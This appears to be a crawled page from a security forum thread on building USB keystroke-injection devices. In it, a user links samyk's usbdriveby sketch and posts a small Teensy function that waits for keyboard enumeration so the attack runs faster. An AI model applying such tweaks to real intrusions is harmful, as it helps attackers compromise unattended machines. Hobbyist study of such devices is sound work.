              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="2" />
              <span class='post-likes'>2 Likes</span>
            </div>


            
          </div>
          <div id='post_4' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/0x00pf.html'><span itemprop='name'>0x00pf</span></a>
                (pico)
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2016-10-03T19:15:33Z' class='post-time'>
                    October 3, 2016,  7:15pm
                  </time>
                  <meta itemprop='dateModified' content='2016-10-03T19:15:33Z'>
              <span itemprop='position'>4</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>The USBarmory is a very neat device. It is more powerful that Arietta, but it cost more than 3 times more‚Ä¶</p>
<p>Thanks for sharing the videos‚Ä¶ Haven‚Äôt read the blog post yet</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="1" />
              <span class='post-likes'>1 Like</span>
            </div>


            
          </div>
          <div id='post_5' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/0x00pf.html'><span itemprop='name'>0x00pf</span></a>
                (pico)
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2016-10-03T19:16:24Z' class='post-time'>
                    October 3, 2016,  7:16pm
                  </time>
                  <meta itemprop='dateModified' content='2016-10-03T19:16:24Z'>
              <span itemprop='position'>5</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Did it worked?..I tried some simple test with the Leonardo some time ago. Do not remember if they use the same functions for the HID functionality.</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="0" />
              <span class='post-likes'></span>
            </div>


            
          </div>
          <div id='post_6' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/pry0cc.html'><span itemprop='name'>pry0cc</span></a>
                (Leader &amp; Offsec Engineer &amp; Forum Daddy)
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2016-10-03T20:04:19Z' class='post-time'>
                    October 3, 2016,  8:04pm
                  </time>
                  <meta itemprop='dateModified' content='2016-10-03T20:04:19Z'>
              <span itemprop='position'>6</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Loving this!! Might have to do this‚Ä¶ Good job pico <img src="../../../0x00sec.org/images/emoji/twitter/winkc164.html?v=9" title=":wink:" class="emoji" alt=":wink:"> - as always</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="1" />
              <span class='post-likes'>1 Like</span>
            </div>


            
          </div>
          <div id='post_7' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/oaktree.html'><span itemprop='name'>oaktree</span></a>
                (oaktree)
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2016-10-03T21:43:16Z' class='post-time'>
                    October 3, 2016,  9:43pm
                  </time>
                  <meta itemprop='dateModified' content='2016-10-03T21:43:16Z'>
              <span itemprop='position'>7</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>More or less. I wrote my own code.</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="1" />
              <span class='post-likes'>1 Like</span>
            </div>


            
          </div>
          <div id='post_8' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/FFY00.html'><span itemprop='name'>FFY00</span></a>
                (3,4,5-trimethoxyphenethylamine)
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2016-10-08T11:04:31Z' class='post-time'>
                    October 8, 2016, 11:04am
                  </time>
                  <meta itemprop='dateModified' content='2016-10-08T11:04:31Z'>
              <span itemprop='position'>8</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Add this method to the setup and remove the first delay. The method will wait til teensy is detected as a keyboard, this will save you some time.</p>
<p>Original Code: <a href="../../../external.html?link=https://github.com/samyk/usbdriveby/blob/master/usbdriveby_windows.ino" rel="nofollow noopener">https://github.com/samyk/usbdriveby/blob/master/usbdriveby_windows.ino</a></p>
<pre><code>void waitForDrivers()
        {
            while (!(keyboard_leds &amp; 2))
            {
                key(KEY_CAPS_LOCK, 0);
            }
            if (keyboard_leds &amp; 2)
            {
                key(KEY_CAPS_LOCK, 0);
            }
        }</code></pre>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="3" />
              <span class='post-likes'>3 Likes</span>
            </div>


            
          </div>
          <div id='post_9' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/0x00pf.html'><span itemprop='name'>0x00pf</span></a>
                (pico)
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2016-10-08T11:08:16Z' class='post-time'>
                    October 8, 2016, 11:08am
                  </time>
                  <meta itemprop='dateModified' content='2016-10-08T11:08:16Z'>
              <span itemprop='position'>9</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Good trick‚Ä¶ I‚Äôll try</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="0" />
              <span class='post-likes'></span>
            </div>


            
          </div>
          <div id='post_10' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/system.html'><span itemprop='name'>system</span></a>
                (system)
                  Closed 
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2018-01-21T00:34:39Z' class='post-time'>
                    January 21, 2018, 12:34am
                  </time>
                  <meta itemprop='dateModified' content='2018-01-21T00:34:39Z'>
              <span itemprop='position'>10</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>This topic was automatically closed after 30 days. New replies are no longer allowed.</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="0" />
              <span class='post-likes'></span>
            </div>


            
          </div>
    </div>


    




    </div>
    <footer class="container wrap">
  <nav class='crawler-nav'>
    <ul>
      <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
        <span itemprop='name'>
          <a href='../../index.html' itemprop="url">Home </a>
        </span>
      </li>
      <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
        <span itemprop='name'>
          <a href='../../categories.html' itemprop="url">Categories </a>
        </span>
      </li>
      <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
        <span itemprop='name'>
          <a href='../../guidelines.html' itemprop="url">Guidelines </a>
        </span>
      </li>
        <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
          <span itemprop='name'>
            <a href='../../tos.html' itemprop="url">Terms of Service </a>
          </span>
        </li>
        <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
          <span itemprop='name'>
            <a href='../../privacy.html' itemprop="url">Privacy Policy </a>
          </span>
        </li>
    </ul>
  </nav>
  <p class='powered-by-link'>Powered by <a href="../../../external.html?link=https://www.discourse.org/">Discourse</a>, best viewed with JavaScript enabled</p>
</footer>

    
    <script src="../../../external.html?link=http://instant.page/3.0.0" type="module" defer="" integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1" nonce="iFnJ4erueiqnOddilmpQLAE5v"></script>
  </body>
  
</html>
